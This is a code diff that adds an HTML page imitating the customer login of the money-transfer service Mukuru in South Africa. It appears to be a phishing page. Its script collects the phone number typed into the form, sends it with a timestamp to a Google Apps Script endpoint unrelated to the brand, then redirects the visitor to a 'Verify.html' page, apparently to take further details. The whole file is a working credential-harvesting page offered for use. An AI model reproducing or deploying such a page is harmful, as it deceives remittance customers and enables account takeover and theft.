@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mukuru Login</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    background: #f5f5f5;
+}
+
+/* Header */
+.header {
+    background: #ff3c00;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 15px;
+    font-size: 22px;
+    font-weight: bold;
+}
+
+.header img {
+    width: 35px;
+    height: 35px;
+    object-fit: contain;
+}
+
+/* Notice box */
+.notice {
+    background: #444;
+    color: #fff;
+    padding: 12px;
+    margin: 15px;
+    border-radius: 6px;
+    font-size: 13px;
+    text-align: center;
+}
+
+/* Container */
+.container {
+    max-width: 400px;
+    margin: auto;
+    padding: 20px;
+    background: #fff;
+    border-radius: 10px;
+}
+
+/* Title */
+.title {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.title h1 {
+    font-size: 26px;
+    color: #333;
+}
+
+.title span {
+    color: #ff3c00;
+}
+
+/* Country */
+.country {
+    text-align: center;
+    font-size: 18px;
+    margin-bottom: 20px;
+}
+
+/* Input */
+.input-box {
+    margin-bottom: 20px;
+}
+
+.input-box input {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-bottom: 2px solid #ccc;
+    font-size: 16px;
+    outline: none;
+}
+
+/* Buttons */
+.btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    margin-bottom: 10px;
+}
+
+.login-btn {
+    background: #ff3c00;
+    color: #fff;
+}
+
+.signup-btn {
+    background: #fff;
+    border: 2px solid #ccc;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+    .container {
+        margin: 10px;
+    }
+}
+</style>
+
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+    <img src="https://i.ibb.co/vCFvNQ01/53815945244.png" alt="Mukuru Logo">
+    <span>mukuru</span>
+</div>
+
+<!-- Notice -->
+<div class="notice">
+    SEND NOW! DIAL *130*567# OR WHATSAPP US AT +27 860 018 555 AND SAY HI
+</div>
+
+<!-- Main Container -->
+<div class="container">
+
+    <div class="title">
+        <h1>CUSTOMER <span>login</span></h1>
+    </div>
+
+    <div class="country">
+        South Africa
+    </div>
+
+<!-- FIXED WORKING SUBMIT BUTTON -->
+
+<form id="loginForm">
+
+    <div class="input-box">
+        <input 
+            type="email"
+            id="email"
+            name="email"
+            placeholder="Enter you Souh African Number here  (eg.0027"
+            required
+        >
+    </div>
+
+    
+
+    <!-- IMPORTANT: type="submit" -->
+    <button type="submit" class="btn login-btn">
+        Log in
+    </button>
+
+    <!-- IMPORTANT: type="button" -->
+    <button type="button" class="btn signup-btn">
+        Sign up
+    </button>
+
+</form>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    let email = document.getElementById("email").value.trim();
+
+    if(email === ""){
+        alert("Please fill all fields");
+        return;
+    }
+
+    fetch("https://script.google.com/macros/s/AKfycbxKKCeATCDnjZATR07UBrfdL6wU79xWDbcYVzlP1XV48RiJdjBec6PxX6HTQA6yNcoV/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            email: email,
+            date: new Date().toLocaleString()
+        })
+    })
+    .then(() => {
+     
+
+        // Redirect after submit
+        window.location.href = "Verify.html";
+    })
+    .catch((error) => {
+        alert("Submission Failed");
+        console.log(error);
+    });
+});
+</script>
+   
+  
+
+</div>
+
+</body>
+</html>
